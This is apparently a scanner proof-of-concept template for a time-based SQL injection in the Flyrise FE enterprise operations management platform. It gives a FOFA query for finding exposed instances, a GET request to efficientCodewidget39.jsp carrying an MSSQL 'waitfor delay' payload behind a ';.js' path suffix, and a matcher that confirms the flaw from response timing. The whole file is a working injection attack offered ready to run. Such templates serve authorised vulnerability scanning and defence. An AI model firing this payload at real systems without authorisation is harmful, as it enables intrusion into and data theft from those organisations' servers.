id: poc-yaml-flyrise-fe-efficientCodewidget39-sqli
info:
  name: 飞企互联-FE 企业运营管理平台 efficientCodewidget39 SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 企业运营管理平台
  fofa: app="飞企互联-FE企业运营管理平台"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /common/efficientCodewidget39.jsp;.js?code=1%27;waitfor+delay+%270:0:{{.t1}}%27--+
  expression: 'status_code == 200 &&

    contains(title,"表单控件") &&

    contains(body,"请输入搜索关键字") &&

    duration > t1 &&

    duration < t2

    '
transport: http
